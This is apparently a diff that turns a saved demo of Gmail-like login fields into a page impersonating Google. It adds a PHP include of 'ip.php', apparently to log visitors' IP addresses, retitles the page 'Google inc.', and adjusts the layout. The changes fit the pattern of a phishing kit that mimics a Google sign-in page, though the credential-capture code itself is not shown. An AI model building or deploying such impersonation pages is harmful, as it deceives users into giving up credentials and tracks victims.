@@ -1,3 +1,6 @@
+<?php
+include 'ip.php';
+?>
 <!DOCTYPE html>
 <!-- saved from url=(0069)https://www.freakyjolly.com/demo/gmail-like-login-fields-example.html -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -26,7 +29,7 @@ window.ezogetrqbykey=function(b){for(var a=0,g=__ez.a[2].length;a<g;a++)if(__ez.
     <link href="./index_files/bootstrap.min.css" rel="stylesheet">
     <script src="./index_files/jquery.min.js.download"></script>
 
-    <title>Document</title>
+    <title>Google inc.</title>
 
     <style>
         .form-wrapper-outer{
@@ -58,7 +61,7 @@ window.ezogetrqbykey=function(b){for(var a=0,g=__ez.a[2].length;a<g;a++)if(__ez.
         }
          
         .form-greetingss{
-            text-align: left;
+            text-align: center;
             font-size: 17px;
             margin-bottom: 10px;
             color: black;
